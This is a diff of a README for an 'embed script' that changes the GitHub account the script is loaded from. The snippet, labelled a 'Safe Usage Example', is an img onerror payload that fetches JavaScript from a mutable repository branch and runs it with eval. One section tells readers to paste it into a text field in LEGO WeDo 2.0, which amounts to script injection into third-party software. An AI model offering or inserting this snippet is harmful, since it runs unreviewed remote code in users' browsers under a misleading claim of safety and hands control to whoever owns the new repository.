@@ -2,7 +2,7 @@
 
 ## 📦 `placeholder.dev` Embed Script
 
-This is an embeddable JavaScript loader for the [`placeholder.dev`](https://github.com/Ikonik24/placeholder.dev) project. It dynamically fetches and executes the latest version of `main.js` from the `main` branch of the GitHub repo.
+This is an embeddable JavaScript loader for the [`placeholder.dev`](https://github.com/devpookie/placeholder.dev) project. It dynamically fetches and executes the latest version of `main.js` from the `main` branch of the GitHub repo.
 
 ---
 
@@ -22,7 +22,7 @@ When this script is embedded in a website, it pulls the latest `main.js` from Gi
 ### ✅ Safe Usage Example
 
 ```html
-<img src="#" onerror='fetch("https://raw.githubusercontent.com/Ikonik24/placeholder.dev/refs/heads/main/main.js").then(r=>r.text()).then(c=>eval(c))'>
+<img src="#" onerror='fetch("https://raw.githubusercontent.com/devpookie/placeholder.dev/refs/heads/main/main.js").then(r=>r.text()).then(c=>eval(c))'>
 ```
 
 Place this `<img>` tag anywhere in your HTML. When the image fails to load, it triggers the `onerror` event, which fetches and executes `main.js`.
@@ -58,6 +58,6 @@ A guide for using the `placeholder.dev` embed script with LEGO® WeDo 2.0's proj
 6. Paste the following embed snippet into the textbox:
 
    ```html
-   <img src="#" onerror='fetch("https://raw.githubusercontent.com/Ikonik24/placeholder.dev/refs/heads/main/main.js").then(r=>r.text()).then(c=>eval(c))'>
+   <img src="#" onerror='fetch("https://raw.githubusercontent.com/devpookie/placeholder.dev/refs/heads/main/main.js").then(r=>r.text()).then(c=>eval(c))'>
    ```
 ---
